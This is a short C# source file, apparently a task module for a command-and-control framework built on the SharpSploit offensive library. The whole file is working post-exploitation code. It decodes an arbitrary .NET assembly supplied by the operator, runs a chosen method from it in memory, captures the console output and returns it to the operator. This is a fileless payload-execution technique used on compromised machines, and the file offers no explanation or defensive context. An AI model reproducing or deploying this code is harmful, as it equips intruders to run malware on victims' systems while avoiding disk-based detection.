using System;
using System.IO;
using System.Linq;
using SharpSploit.Generic;
using SharpSploit.Execution;

public static class Task
{
    public static string Execute(string EncodedAssembly, string TypeName, string MethodName, string Parameters = "")
    {
        Object[] args = default(Object[]);
        if (Parameters != null && Parameters != "")  { args = Parameters.Split(',').Select(P => (Object)P).ToArray(); }
        
        TextWriter realStdOut = Console.Out;
        TextWriter realStdErr = Console.Error;
        TextWriter stdOutWriter = new StringWriter();
        TextWriter stdErrWriter = new StringWriter();
        Console.SetOut(stdOutWriter);
        Console.SetError(stdErrWriter);
        
        GenericObjectResult result = Assembly.AssemblyExecute(EncodedAssembly, TypeName, MethodName, args);
        
        Console.Out.Flush();
        Console.Error.Flush();
        Console.SetOut(realStdOut);
        Console.SetError(realStdErr);
        
        string output = stdOutWriter.ToString();
        output += stdErrWriter.ToString();
        output += result.Result.ToString();
        
        return output;
    }
}